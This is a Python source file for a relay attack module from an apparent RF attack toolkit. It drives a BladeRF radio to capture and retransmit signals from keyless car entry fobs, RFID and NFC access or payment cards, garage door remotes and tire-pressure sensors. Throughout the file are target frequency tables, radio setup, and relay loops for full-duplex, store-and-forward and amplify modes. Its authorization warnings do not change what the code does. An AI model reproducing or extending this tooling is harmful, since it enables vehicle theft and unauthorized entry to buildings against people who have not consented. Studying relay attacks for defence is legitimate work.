#!/usr/bin/env python3
"""
RF Arsenal OS - Full-Duplex Relay Attack Module
Hardware: BladeRF 2.0 micro xA9 (simultaneous TX/RX)

Full-duplex relay attack capabilities:
- Car key relay (extend range of keyless entry)
- Access card relay (RFID/NFC proximity cards)
- Garage door relay
- Payment card relay (research only)
- Two-device relay coordination
- Signal amplification and retransmission
"""

import logging
import numpy as np
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Callable, Tuple
from enum import Enum
from datetime import datetime
import threading
import queue
import time

logger = logging.getLogger(__name__)


class RelayMode(Enum):
    """Relay attack modes"""
    FULL_DUPLEX = "full_duplex"           # Single device simultaneous RX/TX
    TWO_DEVICE = "two_device"             # Coordinated pair of devices
    STORE_FORWARD = "store_forward"       # Capture, process, retransmit
    AMPLIFY = "amplify_forward"           # Real-time amplification


class TargetType(Enum):
    """Target device types"""
    CAR_KEY = "car_key"                   # Keyless entry (125kHz + UHF)
    ACCESS_CARD = "access_card"           # RFID proximity cards
    GARAGE_DOOR = "garage_door"           # Rolling code remotes
    NFC_CARD = "nfc_card"                # 13.56 MHz NFC
    BLUETOOTH_KEY = "bluetooth_key"       # BLE-based keys
    TIRE_PRESSURE = "tpms"               # TPMS sensors
    CUSTOM = "custom"                    # User-defined frequency


class ModulationType(Enum):
    """Signal modulation types"""
    ASK = "ask"                          # Amplitude Shift Keying
    OOK = "ook"                          # On-Off Keying
    FSK = "fsk"                          # Frequency Shift Keying
    PSK = "psk"                          # Phase Shift Keying
    GFSK = "gfsk"                        # Gaussian FSK


@dataclass
class RelayConfig:
    """Relay attack configuration"""
    mode: RelayMode = RelayMode.FULL_DUPLEX
    target_type: TargetType = TargetType.CAR_KEY
    rx_frequency: int = 315_000_000      # Hz
    tx_frequency: int = 315_000_000      # Hz
    sample_rate: int = 2_000_000         # 2 MSPS
    bandwidth: int = 1_000_000           # 1 MHz
    rx_gain: int = 60                    # dB
    tx_gain: int = 60                    # dB
    modulation: ModulationType = ModulationType.ASK
    latency_target_us: int = 100         # Target latency in microseconds
    auto_gain: bool = True


@dataclass
class RelaySession:
    """Active relay session info"""
    session_id: str
    target_type: TargetType
    rx_frequency: float
    tx_frequency: float
    packets_relayed: int
    bytes_relayed: int
    start_time: str
    latency_avg_us: float
    latency_min_us: float
    latency_max_us: float
    success_rate: float
    is_active: bool = True


@dataclass
class CapturedSignal:
    """Captured RF signal for relay"""
    timestamp: str
    frequency: float
    samples: np.ndarray
    power_dbm: float
    modulation: ModulationType
    duration_ms: float
    metadata: Dict = field(default_factory=dict)


class RelayAttacker:
    """
    Full-Duplex Relay Attack System
    
    Uses BladeRF's simultaneous TX/RX capability for real-time
    signal relay with minimal latency. Enables extending the
    range of proximity-based systems.
    
    WARNING: Relay attacks may be illegal. Only use on systems
    you own or have explicit authorization to test.
    """
    
    # Common frequencies for relay targets
    FREQUENCIES = {
        TargetType.CAR_KEY: {
            'lf': 125_000,              # 125 kHz LF wake
            'uf_us': 315_000_000,       # 315 MHz (US)
            'uf_eu': 433_920_000,       # 433.92 MHz (EU/Asia)
            'uhf_eu2': 868_000_000,     # 868 MHz (EU)
        },
        TargetType.ACCESS_CARD: {
            'lf_125': 125_000,          # 125 kHz HID ProxCard
            'lf_134': 134_200,          # 134.2 kHz EM4100
            'hf': 13_560_000,           # 13.56 MHz MIFARE/iClass
        },
        TargetType.GARAGE_DOOR: {
            'us': 315_000_000,          # 315 MHz
            'eu': 433_920_000,          # 433.92 MHz
            'uk': 418_000_000,          # 418 MHz
        },
        TargetType.NFC_CARD: {
            'nfc': 13_560_000,          # 13.56 MHz
        },
        TargetType.TIRE_PRESSURE: {
            'us': 315_000_000,          # 315 MHz
            'eu': 433_920_000,          # 433.92 MHz
        },
    }
    
    def __init__(self, hardware_controller=None):
        """
        Initialize relay attacker
        
        Args:
            hardware_controller: BladeRF hardware controller
        """
        self.hw = hardware_controller
        self.config = RelayConfig()
        self.is_running = False
        self._relay_thread = None
        
        # Signal processing
        self._rx_queue = queue.Queue(maxsize=1000)
        self._tx_queue = queue.Queue(maxsize=1000)
        
        # Statistics
        self._session: Optional[RelaySession] = None
        self._latencies: List[float] = []
        self._packets_relayed = 0
        self._bytes_relayed = 0
        
        # Captured signals for analysis
        self._captured_signals: List[CapturedSignal] = []
        
        # Callbacks
        self._packet_callback: Optional[Callable] = None
        
        logger.info("Relay Attack System initialized")
    
    def configure(self, config: RelayConfig) -> bool:
        """
        Configure relay attack
        
        Args:
            config: RelayConfig with attack parameters
            
        Returns:
            True if configuration successful
        """
        self.config = config
        
        # Set default frequencies based on target
        if config.target_type in self.FREQUENCIES:
            freqs = self.FREQUENCIES[config.target_type]
            if 'uf_us' in freqs:
                config.rx_frequency = freqs['uf_us']
                config.tx_frequency = freqs['uf_us']
        
        # Configure hardware
        if self.hw:
            try:
                # RX configuration (Channel 0)
                self.hw.set_frequency(config.rx_frequency, channel=0, direction='rx')
                self.hw.set_sample_rate(config.sample_rate)
                self.hw.set_bandwidth(config.bandwidth)
                self.hw.set_gain(config.rx_gain, channel=0, direction='rx')
                
                # TX configuration (Channel 1 or same channel for full-duplex)
                self.hw.set_frequency(config.tx_frequency, channel=1, direction='tx')
                self.hw.set_gain(config.tx_gain, channel=1, direction='tx')
                
                logger.info(f"Relay configured: {config.target_type.value}")
                logger.info(f"  RX: {config.rx_frequency/1e6:.3f} MHz")
                logger.info(f"  TX: {config.tx_frequency/1e6:.3f} MHz")
                
            except Exception as e:
                logger.error(f"Hardware configuration failed: {e}")
                return False
        
        return True
    
    def start_relay(self, callback: Optional[Callable] = None) -> bool:
        """
        Start relay attack
        
        Args:
            callback: Optional callback for each relayed packet
            
        Returns:
            True if relay started
        """
        if self.is_running:
            logger.warning("Relay already running")
            return False
        
        logger.warning("STARTING RELAY ATTACK")
        logger.warning("This may be illegal without authorization!")
        
        self._packet_callback = callback
        self.is_running = True
        self._packets_relayed = 0
        self._bytes_relayed = 0
        self._latencies = []
        
        # Create session
        self._session = RelaySession(
            session_id=f"relay_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            target_type=self.config.target_type,
            rx_frequency=self.config.rx_frequency,
            tx_frequency=self.config.tx_frequency,
            packets_relayed=0,
            bytes_relayed=0,
            start_time=datetime.now().isoformat(),
            latency_avg_us=0,
            latency_min_us=float('inf'),
            latency_max_us=0,
            success_rate=100.0
        )
        
        # Start relay thread
        self._relay_thread = threading.Thread(target=self._relay_worker, daemon=True)
        self._relay_thread.start()
        
        logger.info(f"Relay started: {self._session.session_id}")
        return True
    
    def stop_relay(self) -> RelaySession:
        """
        Stop relay attack
        
        Returns:
            Final session statistics
        """
        self.is_running = False
        
        if self._relay_thread:
            self._relay_thread.join(timeout=2.0)
        
        if self._session:
            self._session.is_active = False
            self._session.packets_relayed = self._packets_relayed
            self._session.bytes_relayed = self._bytes_relayed
            
            if self._latencies:
                self._session.latency_avg_us = np.mean(self._latencies)
                self._session.latency_min_us = np.min(self._latencies)
                self._session.latency_max_us = np.max(self._latencies)
        
        logger.info(f"Relay stopped: {self._packets_relayed} packets relayed")
        return self._session
    
    def _relay_worker(self):
        """Main relay worker - receives, processes, transmits"""
        
        if self.config.mode == RelayMode.FULL_DUPLEX:
            self._full_duplex_relay()
        elif self.config.mode == RelayMode.STORE_FORWARD:
            self._store_forward_relay()
        elif self.config.mode == RelayMode.AMPLIFY:
            self._amplify_forward_relay()
    
    def _full_duplex_relay(self):
        """Full-duplex relay with minimal latency"""
        buffer_size = 1024
        
        while self.is_running:
            try:
                start_time = time.perf_counter_ns()
                
                # Receive samples
                if self.hw:
                    samples = self.hw.receive(buffer_size, channel=0)
                else:
                    # Simulation
                    samples = np.random.randn(buffer_size) + 1j * np.random.randn(buffer_size)
                    samples *= 0.001  # Low noise floor
                
                # Detect signal presence
                power = np.mean(np.abs(samples)**2)
                threshold = 0.01
                
                if power > threshold:
                    # Signal detected - relay immediately
                    
                    # Optional: Apply gain adjustment
                    if self.config.auto_gain:
                        samples = self._auto_gain_control(samples)
                    
                    # Transmit immediately
                    if self.hw:
                        self.hw.transmit(samples, channel=1)
                    
                    # Calculate latency
                    end_time = time.perf_counter_ns()
                    latency_us = (end_time - start_time) / 1000
                    self._latencies.append(latency_us)
                    
                    # Update statistics
                    self._packets_relayed += 1
                    self._bytes_relayed += len(samples) * 4  # Complex samples
                    
                    # Callback
                    if self._packet_callback:
                        self._packet_callback({
                            'power_dbm': 10 * np.log10(power + 1e-10),
                            'samples': len(samples),
                            'latency_us': latency_us
                        })
                    
                    # Store for analysis
                    if len(self._captured_signals) < 100:
                        self._captured_signals.append(CapturedSignal(
                            timestamp=datetime.now().isoformat(),
                            frequency=self.config.rx_frequency,
                            samples=samples[:256],  # Store subset
                            power_dbm=10 * np.log10(power + 1e-10),
                            modulation=self.config.modulation,
                            duration_ms=len(samples) / self.config.sample_rate * 1000
                        ))
                
            except Exception as e:
                logger.error(f"Relay error: {e}")
    
    def _store_forward_relay(self):
        """Store and forward relay - allows signal processing"""
        capture_duration = 0.1  # 100ms capture
        num_samples = int(self.config.sample_rate * capture_duration)
        
        while self.is_running:
            try:
                # Capture
                if self.hw:
                    samples = self.hw.receive(num_samples, channel=0)
                else:
                    samples = np.random.randn(num_samples) + 1j * np.random.randn(num_samples)
                
                # Detect and extract signal
                signal = self._extract_signal(samples)
                
                if signal is not None:
                    # Process signal (demodulate, clean, remodulate)
                    processed = self._process_signal(signal)
                    
                    # Transmit
                    if self.hw:
                        self.hw.transmit(processed, channel=1)
                    
                    self._packets_relayed += 1
                    self._bytes_relayed += len(processed) * 4
                    
            except Exception as e:
                logger.error(f"Store-forward error: {e}")
    
    def _amplify_forward_relay(self):
        """Amplify and forward with minimal processing"""
        buffer_size = 256  # Small buffer for low latency
        gain = 10.0  # Amplification factor
        
        while self.is_running:
            try:
                if self.hw:
                    samples = self.hw.receive(buffer_size, channel=0)
                else:
                    samples = np.random.randn(buffer_size) + 1j * np.random.randn(buffer_size)
                
                # Amplify
                amplified = samples * gain
                
                # Clip to prevent saturation
                amplified = np.clip(amplified.real, -1, 1) + 1j * np.clip(amplified.imag, -1, 1)
                
                # Transmit
                if self.hw:
                    self.hw.transmit(amplified, channel=1)
                
            except Exception as e:
                logger.error(f"Amplify-forward error: {e}")
    
    def _auto_gain_control(self, samples: np.ndarray) -> np.ndarray:
        """Apply automatic gain control"""
        # Normalize to target power level
        current_power = np.mean(np.abs(samples)**2)
        target_power = 0.5
        
        if current_power > 1e-10:
            gain = np.sqrt(target_power / current_power)
            # Limit gain
            gain = np.clip(gain, 0.1, 100.0)
            return samples * gain
        
        return samples
    
    def _extract_signal(self, samples: np.ndarray) -> Optional[np.ndarray]:
        """Extract signal from noise"""
        # Calculate power envelope
        power = np.abs(samples)**2
        
        # Smoothing
        window_size = 100
        smoothed = np.convolve(power, np.ones(window_size)/window_size, mode='same')
        
        # Threshold
        threshold = np.mean(smoothed) + 3 * np.std(smoothed)
        
        # Find signal region
        above_threshold = smoothed > threshold
        
        if not np.any(above_threshold):
            return None
        
        # Find start and end
        start = np.argmax(above_threshold)
        end = len(above_threshold) - np.argmax(above_threshold[::-1])
        
        return samples[start:end]
    
    def _process_signal(self, signal: np.ndarray) -> np.ndarray:
        """Process signal before retransmission"""
        # Apply filtering
        # Normalize
        # Add any required modifications
        
        # For now, just normalize
        max_val = np.max(np.abs(signal))
        if max_val > 0:
            signal = signal / max_val * 0.9
        
        return signal
    
    def capture_and_analyze(self, duration_ms: float = 100) -> List[CapturedSignal]:
        """
        Capture signals without relaying for analysis
        
        Args:
            duration_ms: Capture duration in milliseconds
            
        Returns:
            List of captured signals
        """
        num_samples = int(self.config.sample_rate * duration_ms / 1000)
        signals = []
        
        if self.hw:
            samples = self.hw.receive(num_samples, channel=0)
        else:
            samples = np.random.randn(num_samples) + 1j * np.random.randn(num_samples)
        
        # Segment and analyze
        signal = self._extract_signal(samples)
        
        if signal is not None:
            power = np.mean(np.abs(signal)**2)
            
            captured = CapturedSignal(
                timestamp=datetime.now().isoformat(),
                frequency=self.config.rx_frequency,
                samples=signal,
                power_dbm=10 * np.log10(power + 1e-10),
                modulation=self._detect_modulation(signal),
                duration_ms=len(signal) / self.config.sample_rate * 1000
            )
            signals.append(captured)
        
        return signals
    
    def _detect_modulation(self, signal: np.ndarray) -> ModulationType:
        """Detect modulation type of signal"""
        # Simple modulation detection based on signal characteristics
        
        # Check amplitude variations (ASK/OOK)
        amplitude = np.abs(signal)
        amp_var = np.std(amplitude) / np.mean(amplitude)
        
        if amp_var > 0.5:
            # High amplitude variation - likely ASK/OOK
            return ModulationType.OOK
        
        # Check frequency variations (FSK)
        phase = np.unwrap(np.angle(signal))
        freq = np.diff(phase)
        freq_var = np.std(freq)
        
        if freq_var > 0.1:
            return ModulationType.FSK
        
        # Default to ASK
        return ModulationType.ASK
    
    def set_frequencies_for_target(self, target: TargetType, region: str = 'us') -> bool:
        """
        Configure frequencies for specific target
        
        Args:
            target: Target device type
            region: Geographic region ('us', 'eu', 'asia')
            
        Returns:
            True if frequencies set
        """
        if target not in self.FREQUENCIES:
            logger.error(f"Unknown target type: {target}")
            return False
        
        freqs = self.FREQUENCIES[target]
        
        # Select frequency based on region
        if target == TargetType.CAR_KEY:
            if region == 'us':
                freq = freqs.get('uf_us', 315_000_000)
            else:
                freq = freqs.get('uf_eu', 433_920_000)
        elif target == TargetType.GARAGE_DOOR:
            freq = freqs.get(region, freqs.get('us', 315_000_000))
        else:
            # Use first available frequency
            freq = list(freqs.values())[0]
        
        self.config.rx_frequency = freq
        self.config.tx_frequency = freq
        self.config.target_type = target
        
        logger.info(f"Frequencies set for {target.value}: {freq/1e6:.3f} MHz")
        return True
    
    def two_device_mode(self, role: str, partner_ip: str = None) -> bool:
        """
        Configure for two-device relay mode
        
        Args:
            role: 'reader' (near card/key) or 'emulator' (near target)
            partner_ip: IP address of partner device for coordination
            
        Returns:
            True if configured
        """
        logger.info(f"Two-device mode: {role}")
        
        self.config.mode = RelayMode.TWO_DEVICE
        
        # In reader mode: capture signals and send to partner
        # In emulator mode: receive from partner and transmit
        
        # Would implement network coordination here
        
        return True
    
    def get_captured_signals(self) -> List[CapturedSignal]:
        """Get all captured signals"""
        return self._captured_signals
    
    def get_session_info(self) -> Optional[RelaySession]:
        """Get current session info"""
        if self._session:
            self._session.packets_relayed = self._packets_relayed
            self._session.bytes_relayed = self._bytes_relayed
            if self._latencies:
                self._session.latency_avg_us = np.mean(self._latencies)
        return self._session
    
    def get_status(self) -> Dict:
        """Get relay system status"""
        return {
            'running': self.is_running,
            'mode': self.config.mode.value,
            'target': self.config.target_type.value,
            'rx_frequency_mhz': self.config.rx_frequency / 1e6,
            'tx_frequency_mhz': self.config.tx_frequency / 1e6,
            'packets_relayed': self._packets_relayed,
            'bytes_relayed': self._bytes_relayed,
            'avg_latency_us': np.mean(self._latencies) if self._latencies else 0,
            'captured_signals': len(self._captured_signals),
        }


# Convenience function
def get_relay_attacker(hardware_controller=None) -> RelayAttacker:
    """Get relay attacker instance"""
    return RelayAttacker(hardware_controller)
